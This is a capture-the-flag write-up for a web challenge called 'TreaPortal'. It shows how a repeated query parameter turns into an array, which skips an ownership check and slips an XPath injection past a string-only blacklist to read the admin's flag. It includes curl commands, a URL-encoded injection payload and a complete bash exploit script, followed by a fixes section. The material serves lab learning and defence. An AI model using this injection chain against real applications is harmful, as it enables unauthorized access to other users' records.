# TreaPortal: Exploit Writeup

**Goal:** read the administrator's `flag` from the employee portal.
**Starting point:** a normal account. Self-registration is open, so no credentials are needed.
**Root causes:** the `username` check in `/api/user` is skipped for array input (V-01), and the XPath lookup is built by string concatenation with a blacklist that only inspects strings (V-02, V-03). See `VULNERABILITIES.md` for the full list.

---

## 1. Recon

Reading the source shows three things that matter:

1. **`src/routes/user.ts`** is the only route that returns the `flag`. It is protected by `fastify.authenticate` and an ownership check:

   ```ts
   if (typeof username === 'string' && username !== tokenPayload.username) {
       return res.status(403).send({ err: 'Access denied' })
   }
   const user = await getUserByUsername(username)
   ```

   The check only runs when `username` is a **string**. Fastify parses a repeated query parameter (`?username=a&username=b`) into an **array**, so the check is skipped.

2. **`src/services/userService.ts`** builds the lookup by concatenation:

   ```ts
   xpath.select1(`//user[username='${username}']`, doc as any)
   ```

   When `username` is an array, the template literal coerces it to a comma-joined string. So `['a', 'b']` becomes `a,b`.

3. **The blacklist** (`looksLikeXPathInjection`) runs `input.includes(pattern)`. On a string this is a substring test. On an array, `Array.prototype.includes` compares whole elements. A blacklisted token such as `or` is blocked only when an element is exactly `or`. The element `xor` or `x' or username='admin` passes.

Combined, the array form lets us put an arbitrary XPath predicate into the lookup without tripping the filter.

The admin account is seeded by `src/db/init.ts`. Its record contains the flag, and `username` is `admin`.

---

## 2. Get a session

Registration returns a JWT immediately. The email must end in `@trea.htb`.

```bash
TARGET=http://<host>:1337

curl -s -X POST "$TARGET/api/auth/register" \
  -H 'content-type: application/json' \
  -d '{"username":"attacker","email":"attacker@trea.htb","password":"p"}'
# => {"jwt":"eyJ..."}
```

Save the token as `TOKEN`.

---

## 3. Confirm the array bypass

Repeat the parameter with a value that is **not** an injection. Your own username is a control, so use a value that does not match anyone:

```bash
curl -s "$TARGET/api/user?username=attacker&username=attacker" \
  -H "authorization: Bearer $TOKEN"
# => {"err":"User not found"}
```

The request reached the database lookup. The string `attacker,attacker` matched nothing. Compare with a single parameter:

```bash
curl -s "$TARGET/api/user?username=attacker2" -H "authorization: Bearer $TOKEN"
# => {"err":"Access denied"}   (the ownership check fired)
```

That difference confirms the bypass. The 403 is the check. The 404 means the check was skipped and the lookup ran.

---

## 4. Inject into the XPath

Two constraints shape the payload:

- **The comma.** Two array elements are joined with `,`, so the joined string always contains a comma. The payload must place that comma inside an XPath string literal, where it is harmless.
- **The filter.** No element may equal a blacklisted token exactly. Elements like `x' or username='admin' or 'a` are fine.

Target predicate:

```
//user[username='x' or username='admin' or 'a,b'='a']
```

Split it across two elements so the joined string produces that predicate:

| Element | Value | Joined string |
|---------|-------|---------------|
| 1st `username=` value | `x' or username='admin' or 'a` | `x' or username='admin' or 'a,b'='a` |
| 2nd `username=` value | `b'='a` | |

The joined string sits inside the template's `'...'`, which closes it. `'a,b'='a'` is false, and `username='admin'` matches the admin node.

Send it, URL-encoded:

```bash
curl -s "$TARGET/api/user?username=x%27%20or%20username%3D%27admin%27%20or%20%27a&username=b%27%3D%27a" \
  -H "authorization: Bearer $TOKEN"
```

Response:

```json
{"username":"admin","email":"admin@trea.htb","salary":15000,"role":"administrator","flag":"HTB{...}"}
```

---

## 5. Exploit script

```bash
#!/usr/bin/env bash
# Usage: ./exploit.sh http://<host>:1337
set -euo pipefail
TARGET="${1:?usage: $0 http://host:1337}"
NAME="x$RANDOM$RANDOM"

TOKEN=$(curl -s -X POST "$TARGET/api/auth/register" \
  -H 'content-type: application/json' \
  -d "{\"username\":\"$NAME\",\"email\":\"$NAME@trea.htb\",\"password\":\"p\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["jwt"])')

curl -s "$TARGET/api/user?username=x%27%20or%20username%3D%27admin%27%20or%20%27a&username=b%27%3D%27a" \
  -H "authorization: Bearer $TOKEN"
echo
```

---

## 6. Verification

I reproduced the chain against a local copy of the app (a scratch copy, not the challenge directory), with `FLAG` set to a placeholder:

| Request | Result |
|---------|--------|
| Own profile (`?username=attacker`) | 200, own record, `flag: ""` |
| Repeated own name (`?username=attacker&username=attacker`) | 404 `User not found`, so the check was skipped |
| Single-string injection (`?username=x' or username='admin`) | 403 `Access denied` (blocked by the ownership check) |
| Array injection (payload above) | 200, admin record with the flag |

The flag on the real instance is not known to me, so the flag value in this writeup is a placeholder.

---

## 7. Why it works

| Step | Weakness | Finding |
|------|----------|---------|
| Repeated param becomes an array | `typeof === 'string'` check is type-dependent | V-01 |
| Array is coerced to `a,b` in the template | Lookup built by string concatenation | V-02 |
| Blacklist ignores substrings in arrays | Filter uses `includes` on array elements | V-03 |
| Flag stored in plaintext in the user record | Secret is in the data file, not a secret store | V-04 |
| Any registered `@trea.htb` address is accepted | Account creation is unverified | V-07 |

---

## 8. Fixes

1. **Schema-validate the query.** Use `querystring: { username: { type: 'string', minLength: 1, maxLength: 64 } }` so arrays get a 400. Enforce authorization on `tokenPayload.username`, not on raw input (V-01).
2. **Remove string-built XPath.** Use an exact match in code (`getAllUsers().find(u => ... === username)`), or a parameterized database (V-02).
3. **Remove the blacklist.** Validate the format with an allow-list (V-03).
4. **Do not return the flag from a profile endpoint.** Keep secrets out of the user data file (V-04).
